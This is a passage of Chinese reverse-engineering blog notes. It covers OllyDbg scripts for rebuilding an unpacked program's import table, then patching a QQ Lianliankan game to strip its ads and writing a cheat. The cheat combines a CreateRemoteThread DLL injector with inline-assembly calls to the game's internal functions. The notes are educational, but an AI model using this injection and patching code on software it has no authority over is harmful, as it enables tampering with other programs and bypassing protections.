<li><p>这就是所谓获取API地址的地方（不管这个值是怎么出来的，我只知道，运行到此时，eax寄存器中有我想要的东西：原始的API地址）</p>
</li>
</ol>
<h3 id="06-OD脚本自动化修复IAT"><a href="#06-OD脚本自动化修复IAT" class="headerlink" title="06-OD脚本自动化修复IAT"></a>06-OD脚本自动化修复IAT</h3><p>（将真实API的地址添加到IAT，而非壳加密后的值</p>
<p>（要运行至壳OEP时再执行脚本，前面那个系统断点用OD的F9跳过</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基础模版</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 找到三个地址</span></span><br><span class="line">MOV dwGetAPIAddr,<span class="number">004385B</span>F</span><br><span class="line">MOV dwWriteIATAddr, <span class="number">004385F</span>0</span><br><span class="line">MOV dwOEP,<span class="number">00409486</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 设置断点（设置之前先清除所有</span></span><br><span class="line">BC    <span class="comment">// 清除所有软件断点</span></span><br><span class="line">BPHWC <span class="comment">// 清除所有硬件断点</span></span><br><span class="line">BPMC  <span class="comment">// 清除所有内存断点</span></span><br><span class="line"></span><br><span class="line">BPHWS dwGetAPIAddr, <span class="string">"x"</span> <span class="comment">//当执行到此地址时产生中断.</span></span><br><span class="line">BPHWS dwWriteIATAddr, <span class="string">"x"</span> <span class="comment">//当执行到此地址时产生中断.</span></span><br><span class="line">BPHWS dwOEP, <span class="string">"x"</span> <span class="comment">//当执行到此地址时产生中断.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 循环</span></span><br><span class="line">LOOP_START:</span><br><span class="line">  RUN   <span class="comment">// 运行，即F9</span></span><br><span class="line">  CMP dwGetAPIAddr,eip</span><br><span class="line">  JNZ case1</span><br><span class="line">  MOV dwTmp,eax<span class="comment">// 将真实API地址保存至临时变量</span></span><br><span class="line">  JMP LOOP_START</span><br><span class="line">case1:</span><br><span class="line">  CMP dwWriteIATAddr,eip  </span><br><span class="line">  JNZ case2  </span><br><span class="line">  MOV [edi],dwTmp<span class="comment">// 将真实API地址填充至IAT表</span></span><br><span class="line">  JMP LOOP_START</span><br><span class="line">case2:</span><br><span class="line">  CMP dwOEP,eip  </span><br><span class="line">  JNZ LOOP_START  <span class="comment">// 继续循环</span></span><br><span class="line">  MSG <span class="string">"到达OEP!脚本结束"</span><span class="comment">// 若达到OEP则结束</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 依据不同的壳，在基础版本上加以修改</span></span><br><span class="line"><span class="comment">// 1. 找到三个地址</span></span><br><span class="line">MOV dwGetAPIAddr, <span class="number">001</span>A36		<span class="comment">// 获取真实API地址（偏移</span></span><br><span class="line">MOV dwWriteIATAddr, <span class="number">000897</span>	<span class="comment">// 填充IAT（偏移</span></span><br><span class="line">MOV dwOEP, <span class="number">0047148B</span>					<span class="comment">// OEP（真实地址</span></span><br><span class="line">MOV dwBase,<span class="number">0047</span>A37F					<span class="comment">// 壳申请的内存空间首地址（真实地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 设置断点</span></span><br><span class="line">BC    <span class="comment">// 清除所有软件断点</span></span><br><span class="line">BPHWC <span class="comment">// 清除所有硬件断点</span></span><br><span class="line">BPMC  <span class="comment">// 清除所有内存断点</span></span><br><span class="line"></span><br><span class="line">BPHWS dwOEP, <span class="string">"x"</span> 	<span class="comment">//OEP设置断点，此地址不会变</span></span><br><span class="line">BPHWS dwBase, <span class="string">"x"</span> <span class="comment">//申请内存空间返回基地址，是后面两个位置的基础</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 循环</span></span><br><span class="line">LOOP_START:</span><br><span class="line">  RUN   	<span class="comment">// 继续运行，直至下个断点</span></span><br><span class="line"></span><br><span class="line">  CMP dwBase,eip<span class="comment">// 内存空间申请完成，返回基地址</span></span><br><span class="line">  JNZ case0</span><br><span class="line">  ADD dwGetAPIAddr,eax  <span class="comment">// 基址+偏移 = 最终地址</span></span><br><span class="line">  ADD dwWriteIATAddr,eax    </span><br><span class="line">  BPHWS dwGetAPIAddr, <span class="string">"x"</span> <span class="comment">// 有了最终地址，再下断点</span></span><br><span class="line">  BPHWS dwWriteIATAddr, <span class="string">"x"</span> </span><br><span class="line">  JMP LOOP_START <span class="comment">// 断点都下完了，继续执行</span></span><br><span class="line">case0:</span><br><span class="line">  CMP dwGetAPIAddr,eip</span><br><span class="line">  JNZ case1</span><br><span class="line">  MOV dwTmp,eax <span class="comment">// 获取真实API地址，赋值给临时变量</span></span><br><span class="line">  JMP LOOP_START <span class="comment">// 继续执行</span></span><br><span class="line">case1:</span><br><span class="line">  CMP dwWriteIATAddr,eip  </span><br><span class="line">  JNZ case2  </span><br><span class="line">  MOV [edx],dwTmp<span class="comment">// 将临时变量中的真实API地址填充到IAT</span></span><br><span class="line">  JMP LOOP_START<span class="comment">//继续</span></span><br><span class="line">case2:</span><br><span class="line">  CMP dwOEP,eip  <span class="comment">// 若到达OEP，则前面都运行完，结束</span></span><br><span class="line">  JNZ LOOP_START  <span class="comment">// 否则继续执行</span></span><br><span class="line">  MSG <span class="string">"到达OEP!脚本结束"</span><span class="comment">// 弹窗，标示已结束</span></span><br></pre></td></tr></table></figure>
<p>如图，修复完成（OEP是结束条件，所以正好运行至OEP</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135524.jpg" alt="image-20191122213958158"></p>
<h3 id="07-dump内存"><a href="#07-dump内存" class="headerlink" title="07-dump内存"></a>07-dump内存</h3><ul>
<li><p>此时IAT表是正常的，dump下来后，通过此正常的IAT来修复输入表</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135519.jpg" alt="image-20191122214212076"></p>
</li>
</ul>
<h3 id="08-修复输入表"><a href="#08-修复输入表" class="headerlink" title="08-修复输入表"></a>08-修复输入表</h3><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135515.jpg" alt="image-20191122215400920"></p>
<p>脱壳成功</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135520.jpg" alt="image-20191122215429251"></p>
<h3 id="09-参考"><a href="#09-参考" class="headerlink" title="09-参考"></a>09-参考</h3><ul>
<li>15PB 脱壳课程</li>
</ul>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257822.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257822.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>脱壳逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>连连看游戏破解</title>
    <url>/2019/11/16/reverse/%E8%BF%9E%E8%BF%9E%E7%9C%8B%E6%B8%B8%E6%88%8F%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="01-样本概况"><a href="#01-样本概况" class="headerlink" title="01-样本概况"></a>01-样本概况</h1><h2 id="1-1-应用程序信息"><a href="#1-1-应用程序信息" class="headerlink" title="1.1-应用程序信息"></a>1.1-应用程序信息</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">文件: qqllk.exe</span><br><span class="line">大小: <span class="number">1796608</span> bytes</span><br><span class="line">修改时间: <span class="number">2011</span>年<span class="number">11</span>月<span class="number">15</span>日, <span class="number">19</span>:<span class="number">37</span>:<span class="number">34</span></span><br><span class="line">MD5: <span class="number">814</span>DE98DC72E4AB0001BA7F287239D2D</span><br><span class="line">SHA1: <span class="number">0</span>DF1596821188E2333B8F5B8AE94DB775C796B3F</span><br><span class="line">CRC32: <span class="number">8437</span>D6BE</span><br><span class="line">  </span><br><span class="line">文件: qqllk.ocx</span><br><span class="line">大小: <span class="number">903168</span> bytes</span><br><span class="line">修改时间: <span class="number">2008</span>年<span class="number">8</span>月<span class="number">8</span>日, <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MD5: <span class="number">58293</span>D9765FD06BCDFFA638CB596E76C</span><br><span class="line">SHA1: <span class="number">64489B</span>5B2A38A64004D63064761D46350052976C</span><br><span class="line">CRC32: <span class="number">3</span>C82EFC8</span><br><span class="line">  </span><br><span class="line">文件: kyodai.exe</span><br><span class="line">大小: <span class="number">417857</span> bytes</span><br><span class="line">文件版本:<span class="number">0</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">10</span></span><br><span class="line">修改时间: <span class="number">2008</span>年<span class="number">8</span>月<span class="number">8</span>日, <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MD5: AFE5BAEB6F29A197BC935286F55D9366</span><br><span class="line">SHA1: DBB8866904F9621010B428CE12777B392C3F06CE</span><br><span class="line">CRC32: <span class="number">0</span>C1469BB</span><br></pre></td></tr></table></figure>
<h2 id="1-2-分析环境及工具"><a href="#1-2-分析环境及工具" class="headerlink" title="1.2-分析环境及工具"></a>1.2-分析环境及工具</h2><ul>
<li>系统环境: Windows10-64位、Windows7-32位<a id="more"></a></li>
<li>工具: 010Editor、OllyDebug、DbgView、Cheat Engine、PCHunter32、VS 2017</li>
</ul>
<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3-分析目标"></a>1.3-分析目标</h2><ul>
<li>找到原程序exe、去广告</li>
<li>实现连连看外挂：无限指南针、单次消除、秒杀</li>
</ul>
<h1 id="02-具体分析过程"><a href="#02-具体分析过程" class="headerlink" title="02-具体分析过程"></a>02-具体分析过程</h1><h2 id="2-1-去广告"><a href="#2-1-去广告" class="headerlink" title="2.1-去广告"></a>2.1-去广告</h2><ol>
<li>kyodai双击不可运行</li>
<li>qqllk可运行，打开就是一个广告，点击“开始游戏”进入下一窗口</li>
<li>再点击“OK我知道了”再到下个窗口，时刻关注进程列表（火绒剑），发现此时创建了一个新进程qqllk.ocx，虽然看起来后缀不是exe，但是既然出现在了进程列表，其本质就是一个exe</li>
<li>点击“继续”，kyodai进程创建，qqllk.ocx进程关闭，但qqllk.exe进程依然在运行</li>
<li>由此可判定，kyodai是真正的游戏程序，而qqllk是在其基础上，打包了许多广告的程序，去广告，也就是将k从q中分离出来</li>
<li>OD附加那个ocx（而非qqllk.exe），因为是ocx创建出kyodai的</li>
<li>分析：q创建k进程，必然用到创建进程API，ctrl+g搜索CreateProcessA/W并下断</li>
<li>运行，停在762E2082 上，看一下堆栈中的参数，CreationFlags = CREATE_SUSPENDED，创建进程后，是暂停状态</li>
<li>再开一个OD来附加k，用来测试</li>
<li>分析：直接运行k失败，但是通过q就能使其运行，推测q创建进程后，一定是修改了q进程中某些东西，才使其可以运行的</li>
<li>因此，搜索WriteProcessMemory-下断-运行，发现断在759246C7 ，观察堆栈中参数，得出：往目标进程43817a处、写入一个字节、00</li>
<li>修改完之后，再resumeThread来恢复线程，因此流程就是：创建进程-修改进程-恢复线程</li>
<li>根据修改进程时的参数，即往目标进程43817a处、写入一个字节、00，手动修改k程序即可达到目的</li>
<li>打开LordPE，拖入Kyodai，位置计算，43817a-40000=3817a得到RVA（OD附加了那个新创建的进程，E-看到其模块基址为400000），将RVA填入得到文件偏移，也是43817a</li>
<li>010editor打开K程序，ctrl+g跳到文件偏移出，手动将值修改为0（注：远程序只读不可写入，可file-save a copy复制一份再修改</li>
<li>修改后，得到新的K程序，命名为Kyodai-noAd，双击可直接运行，至此，提取成功，也就去除了广告</li>
</ol>
<h2 id="2-2-CE控制游戏以便测试"><a href="#2-2-CE控制游戏以便测试" class="headerlink" title="2.2-CE控制游戏以便测试"></a>2.2-CE控制游戏以便测试</h2><ul>
<li><p>0012AC5E：指南针数量不变</p>
</li>
<li><p>0012A748：时间不变</p>
</li>
<li><p>0012AC6E：重列道具不变</p>
</li>
</ul>
<h2 id="2-3-实现无限指南针"><a href="#2-3-实现无限指南针" class="headerlink" title="2.3-实现无限指南针"></a>2.3-实现无限指南针</h2><h3 id="2-3-1-找数组"><a href="#2-3-1-找数组" class="headerlink" title="2.3.1-找数组"></a>2.3.1-找数组</h3><ol>
<li>ctrl+g：找rand函数，得7623C070 （rand实现处</li>
<li>栈回溯：得0041CAF8 （rand调用处</li>
<li>rand调用后，在0041CB10 ，有一个memcpy，dst为0012BB50，数据窗口跟随</li>
<li>运行完memcpy后，内存窗口有明显变化，且较有规律，推测为连连看数组</li>
<li>不断点击“练习”，并对比内存窗口，空白处为00，不断测试，证实上述猜想</li>
</ol>
<h3 id="2-3-2-找call指南针的地方"><a href="#2-3-2-找call指南针的地方" class="headerlink" title="2.3.2-找call指南针的地方"></a>2.3.2-找call指南针的地方</h3><ol>
<li>数组处下内存访问断点（硬件断点无效），点击“指南针”，断在此处</li>
<li>K-调用堆栈处，一层一层下断点，逐个测试（先随便下5、6个断点</li>
<li>一次测试，多次循环断下的位置先排除，效果应该是一点“指南针”就断，满足此条件的有：0040CACA -0041AF11 -0041DE5C -0041E76C ，故最外层的为0040CACA（当前测试的几个断点中最外层），最里层的为 0041E76C</li>
<li>由内而外，依次来看每个call的具体作用</li>
<li>最里层的0041E76C：两个参数，将局部变量赋值为eax再push（dword ptr，4个字节），分别为：00129D8C 、00129D94 ，将两个地址数据窗口跟随（分别M1、M2便于观察），call完成之后，返回值通过push进去的地址体现（指针间接修改），94前4个字节为20，8c前4字节为49，对比游戏界面，为两个坐标，也就是用了指南针用于提示的两个位置，故此处call，获得待连接的两个位置</li>
<li>再往外一层0041DE5C：虽连续三个push，但都是些没意义的参数，故推测，其仅仅是一个“使用道具”的函数， （因为参数无意义，故推测其并没有完成什么实质性功能，其调用仅仅为了进一步调用那些有用的函数），call了0041E691，推测这就是“指南针道具”的函数（因为有多个工具，call后面跟具体的哪个道具</li>
</ol>
<h3 id="2-3-3-找基址"><a href="#2-3-3-找基址" class="headerlink" title="2.3.3-找基址"></a>2.3.3-找基址</h3><ol>
<li>由上，只要主动调用0041DE5C，倒数第二的那个函数即可</li>
<li>要调用就要手动传入正确的参数，以假装它是在正常的程序内部调用的；</li>
<li>参数除了通过push进去那三个（栈传递的），还可能是通过ecx寄存器传递的（thiscall）即那个lea ecx,[esi+xx]，事实上，也就ecx那个参数看起来靠谱，像一个地址，但是简单将ecx作为参数是不可的，其地址esi+xx=12xx，一看就是栈空间的局部变量，具有不确定性，可能每次运行都不一样，因此，追本溯源，网上找ecx究竟是哪来的（要找到一个基地址</li>
<li>经测试，一直向上找是找不尽的，故换思路</li>
<li>esi是0012A1F4，CE中搜索，发现有几个绿色的地址（即基址），有了基址就能在程序外手动的调用函数（不应该用变值作为参数），几个基址：45DCF8、45DEBC（用这个）、47FDEO、777FEDE8（7开头，暂不考虑</li>
</ol>
<h3 id="2-3-4-编写注入工具exe及外挂dll"><a href="#2-3-4-编写注入工具exe及外挂dll" class="headerlink" title="2.3.4-编写注入工具exe及外挂dll"></a>2.3.4-编写注入工具exe及外挂dll</h3><ol>
<li><p>有了基址，就可以构造不变化的参数，就可以手动调用程序内部的参数</p>
</li>
<li><p>编写注入程序：Injector.exe</p>
</li>
<li><p>编写被注入dll：MFCGamePlugin.dll（win10虚拟机</p>
</li>
<li><p>Injector.cpp源码</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Injector.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//要加载的dll路径</span></span><br><span class="line"><span class="comment">// 最好改为相对路径（相对于连连看程序的</span></span><br><span class="line"><span class="comment">// WCHAR szDllPath[] = L"C:\\Users\\15pb-win7\\Desktop\\MFCGamePlugin.dll";</span></span><br><span class="line">WCHAR szDllPath[] = <span class="string">L"../../MFCGamePlugin.dll"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1.要注入，需要dll文件</span></span><br><span class="line">	<span class="comment">//2.找到要注入的进程PID</span></span><br><span class="line">	DWORD dwPid=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//HWND hwnd = FindWindow(NULL, L"new 1 - Notepad++");</span></span><br><span class="line">	<span class="comment">//GetWindowThreadProcessId(hwnd, &amp;dwPid);</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"please input PID&gt;&gt; "</span>);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;dwPid);</span><br><span class="line">	<span class="comment">//3.打开进程，获取进程句柄</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="comment">//4.在目标进程中申请空间</span></span><br><span class="line">	LPVOID pBuff = VirtualAllocEx(</span><br><span class="line">		hProcess,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="keyword">sizeof</span>(szDllPath),</span><br><span class="line">		MEM_RESERVE | MEM_COMMIT,</span><br><span class="line">		PAGE_EXECUTE_READWRITE</span><br><span class="line">	);</span><br><span class="line">	<span class="comment">//5.将路径写入到目标进程中</span></span><br><span class="line">	DWORD dwSize;</span><br><span class="line">	WriteProcessMemory(</span><br><span class="line">		hProcess,</span><br><span class="line">		pBuff,			<span class="comment">//在指申请的地址上</span></span><br><span class="line">		szDllPath,		<span class="comment">//写入的内容</span></span><br><span class="line">		<span class="keyword">sizeof</span>(szDllPath),<span class="comment">//写入大小</span></span><br><span class="line">		&amp;dwSize</span><br><span class="line">	);</span><br><span class="line">	<span class="comment">//6.使用关键函数加载目标dll</span></span><br><span class="line">	<span class="comment">// 利用远程创建线程函数，实现目标进程加载dll</span></span><br><span class="line">	<span class="comment">// 远程线程执行函数直接指向LoadLibaray函数，同时参数指向dll路径，完美实现加载dll</span></span><br><span class="line">	HANDLE hThread = CreateRemoteThread(</span><br><span class="line">		hProcess,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)LoadLibrary,		<span class="comment">//线程执行地址指向LoadLibrary</span></span><br><span class="line">		pBuff,										<span class="comment">//线程的附加参数dll路径</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="comment">//7 释放句柄</span></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="5">
<li><p>MFCGamePlugin.cpp关键代码</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Msg == WM_DATA1)</span><br><span class="line">&#123;</span><br><span class="line">	OutputDebugString(<span class="string">L"无限指南针"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//0041DE4D | .  8B86 9404000 &gt; MOV EAX, DWORD PTR DS : [ESI + 0x494]</span></span><br><span class="line">	<span class="comment">//0041DE53 | .  8D8E 9404000 &gt; LEA ECX, DWORD PTR DS : [ESI + 0x494]</span></span><br><span class="line">	<span class="comment">//0041DE59 | .  52           PUSH EDX</span></span><br><span class="line">	<span class="comment">//0041DE5A | .  53           PUSH EBX</span></span><br><span class="line">	<span class="comment">//0041DE5B | .  53           PUSH EBX</span></span><br><span class="line">	<span class="comment">//0041DE5C | .FF50 28      CALL DWORD PTR DS : [EAX + 0x28];  使用指南针道具</span></span><br><span class="line">	_asm </span><br><span class="line">	&#123;</span><br><span class="line">		mov ecx, <span class="number">0x45DEBC</span></span><br><span class="line">		mov ecx, [ecx]</span><br><span class="line">		LEA ECX, DWORD PTR DS : [ecx + <span class="number">0x494</span>]</span><br><span class="line">		PUSH <span class="number">0xF0</span><span class="comment">// 若炸弹，则F4</span></span><br><span class="line">		PUSH <span class="number">0</span></span><br><span class="line">		PUSH <span class="number">0</span></span><br><span class="line">		mov eax, <span class="number">0x0041E691</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hWnd, Msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2-4-实现单次消除"><a href="#2-4-实现单次消除" class="headerlink" title="2.4-实现单次消除"></a>2.4-实现单次消除</h2><ol>
<li><p>要想消除，就需要获得可以消除的两个点，由上知，指南针call中最里面的那个0041E76C，就可以提供两个点（且可以消除</p>
</li>
<li><p>在手动找两个可消除的两个点，消除过程中，必然会访问连连看数组（将相应位置置为0），在数组处下内存写入断点，会断下来0040FF5F ，然后删除内存断点，F2下断，通过栈回溯，不断找“消除”时会调用的call</p>
</li>
<li><p>（注意，写入哪个会在哪个断下，以每个字节为单位，并非写入数组中任意一个位置，都会断下，所以，根据点击的那两个将要消除的点，在数组内存所在处相应位置下断）</p>
</li>
<li><p>从外到里，找到如下call：0041B4B7 -0041AB34 -0041C6C3， </p>
</li>
<li><p>就像指南针那个一样，必然不止一个，由内而外/由外而内依次检查每一个call，看其做了什么工作，检查其参数都是干嘛的（看push了谁，代码或堆栈中看），看看哪个传入了点的坐标（要想消除，就需要这两个点）</p>
</li>
<li><p>0041B4B7：内部retn 0x1c=28=7个参数，从栈顶依次找7个参数，就参数2靠谱点，是一个地址（其他都是数，一看就不是点坐标），数据窗口中跟随，确实是两个点坐标，再看游戏窗口中点击的那两个待消除的点，确实也符合，但是是一个地址中保存了两个点，而非理想中的一个参数对应一个点，先记下，继续往后找（尽量往里找，找更满足条件的）</p>
</li>
<li><p>0041AB34 ：enter进入call的内部，在最后retn 0x18=24=6个参数，参数1-0、参数2-连连看数组地址、参数3-点1坐标、参数4-点2坐标、参数5-同上一样，有那两个点的坐标，暂记做坐标点数组、参数6-数值2，这么一看，这个call相当靠谱</p>
</li>
<li><p>最里层那个call4个参数，不太靠谱，故从里往外，倒数第二个即为目标call，0041AB34，通过其来构造汇编代码，实现程序外调用</p>
</li>
<li><p>难点及重点：如何构造call这个函数相应的6个参数？通过程序中汇编代码来构造，在call之前，第一个push处下断，看每一个参数的值都是怎么来的（追本溯源）</p>
</li>
<li><p>参数2/5比较难找：参数2=12BB50，参数5=1A5DE18，看这俩值怎么构造，是这么x+y=的</p>
</li>
<li><p>注意一点：call单次消除用到获取两点坐标功能，而后者又是在call指南针功能中调用的，就像注释中所说的</p>
<p>  lea ecx, DWORD PTR DS : [ecx + 0x494]// 要加上此，原程序中，此函数是在call指南针内部call的<br>  mov ecx, DWORD PTR DS : [ecx + 0x19F0]// 即在前面的基础上调用的，因此ecx…</p>
</li>
<li><p>注意：不仅要构造模拟参数，还有注意各个寄存器的值（用不到的就不管），如ecx=0012A1F4，在基址中45DEBC存储，它是好找的</p>
</li>
<li>因此，对于参数2和参数5，二者的值，可以在ecx的基础上+某个数得到，参数2+40，参数5+4，要特别注意此思路，不管他为什么要加上此数的，只要构造出这个值就行</li>
<li>（这样就看出，这个ecx的值特别重要，作为一个基础，而那个基址中存储的这个ecx，可见，找到合适的基址尤其重要，是构造汇编代码的重中之重，特别注意基址的寻找，有了基址，一切都好办（哪怕同参数2/5一样，强行+x构造出某个值，只要我能构造出程序当时运行的环境就行</li>
</ol>
<h2 id="2-5-实现秒杀"><a href="#2-5-实现秒杀" class="headerlink" title="2.5-实现秒杀"></a>2.5-实现秒杀</h2><ol>
<li><p>就是单次消除功能的循环，设置一个停止条件即可，点坐标的x/y==0</p>
</li>
<li><p>关键代码</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MFCGamePlugin.cpp</span></span><br><span class="line"><span class="comment">// 循环消除中，判断是否停止</span></span><br><span class="line"><span class="keyword">if</span> (pt1.x == <span class="number">0</span> &amp;&amp; pt1.y == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CMyDlg.cpp</span></span><br><span class="line"><span class="keyword">void</span> CMyDlg::OnBnClickedButton3()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"></span><br><span class="line">	CMFCGamePluginApp* pApp = (CMFCGamePluginApp*)AfxGetApp();</span><br><span class="line">	<span class="comment">// 循环消除</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> nRet = ::SendMessage(pApp-&gt;m_hWnd, WM_DATA2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (nRet == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2-6-另一个思路来单消-秒杀"><a href="#2-6-另一个思路来单消-秒杀" class="headerlink" title="2.6-另一个思路来单消/秒杀"></a>2.6-另一个思路来单消/秒杀</h2><ol>
<li><p>不断测试，当点击两个炸弹成功消除后，会出现炸弹道具</p>
</li>
<li><p>同理，找到相应的call，观察参数，发现同指南针相比，就是F0换成了F4，二者就是一样的思路来的</p>
</li>
<li><p>炸弹一次就相当于单次消除，加上循环便是秒杀（此时循环没有加停止条件，仅限制了循环次数，无伤大雅，有那个意思就行</p>
</li>
<li><p>版本1的单次消除和秒杀：获取两个点+手动消除，本思路借用炸弹道具，明显简单多了，也提了个醒，逆向时，要举一反三，通过指南针道具的调用，联想其他工具，程序员一般都是按照同一个思路来做的，无非换个参数（时间有限，其他道具也是这个道理，学到思路即可</p>
</li>
<li><p>关键代码</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Msg == WM_DATA2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 1 获取两个点坐标</span></span><br><span class="line">	POINT pt1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	POINT pt2=&#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 小技巧，用于调试，当注入成功时，ctrl+s 搜索指令找到此dll地址</span></span><br><span class="line">	<span class="comment">//_asm</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	mov eax,eax</span></span><br><span class="line">	<span class="comment">//	mov eax,eax</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0041E75E &gt; \8B8E F0190000 MOV ECX, DWORD PTR DS : [ESI + 0x19F0];  Case F0(BM_GETCHECK) of switch 0041E749</span></span><br><span class="line">	<span class="comment">//0041E764   .  8D45 D8       LEA EAX, DWORD PTR SS : [EBP - 0x28]</span></span><br><span class="line">	<span class="comment">//0041E767   .  50            PUSH EAX</span></span><br><span class="line">	<span class="comment">//0041E768   .  8D45 E0       LEA EAX, DWORD PTR SS : [EBP - 0x20]</span></span><br><span class="line">	<span class="comment">//0041E76B   .  50            PUSH EAX</span></span><br><span class="line">	<span class="comment">//0041E76C.E8 CEAA0000   CALL kyodai2.0042923F;  提示待连接的两个坐标</span></span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov ecx, <span class="number">0x45DEBC</span></span><br><span class="line">		mov ecx, [ecx]</span><br><span class="line">		lea ecx, DWORD PTR DS : [ecx + <span class="number">0x494</span>]<span class="comment">// 要加上此，原程序中，此函数是在call指南针内部call的</span></span><br><span class="line">		mov ecx, DWORD PTR DS : [ecx + <span class="number">0x19F0</span>]<span class="comment">// 即在前面的基础上调用的，因此ecx...</span></span><br><span class="line">		lea eax, pt1.x</span><br><span class="line">		push eax<span class="comment">// 原程序，push的是栈地址</span></span><br><span class="line">		lea eax, pt2.x</span><br><span class="line">		push eax</span><br><span class="line">		mov eax,<span class="number">0x0042923F</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	CString strCode;</span><br><span class="line">	strCode.Format(<span class="string">L"单次消除: 点1 x=%d,y=%d,点2 x=%d,y=%d"</span>, pt1.x, pt1.y, pt2.x, pt2.y);</span><br><span class="line">	OutputDebugString(strCode.GetBuffer());</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 循环消除中，判断是否停止</span></span><br><span class="line">	<span class="keyword">if</span> (pt1.x == <span class="number">0</span> &amp;&amp; pt1.y == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2 调用消除call</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0041AB13 | &gt; \57            PUSH EDI;  参数6:2（当前edi = 2</span></span><br><span class="line">	<span class="comment">//0041AB14 | .  8D45 F4       LEA EAX, [LOCAL.3]</span></span><br><span class="line">	<span class="comment">//0041AB17 | .  53            PUSH EBX;  参数5：坐标数组（ = 1A5DE18 = ？ + ？</span></span><br><span class="line">	<span class="comment">//0041AB18 | .  50            PUSH EAX;  参数4：点2坐标（eax来自local3，就是点坐标</span></span><br><span class="line">	<span class="comment">//0041AB19 | .  8D45 EC       LEA EAX, [LOCAL.5]</span></span><br><span class="line">	<span class="comment">//0041AB1C | .  8BCE          MOV ECX, ESI</span></span><br><span class="line">	<span class="comment">//0041AB1E | .  50            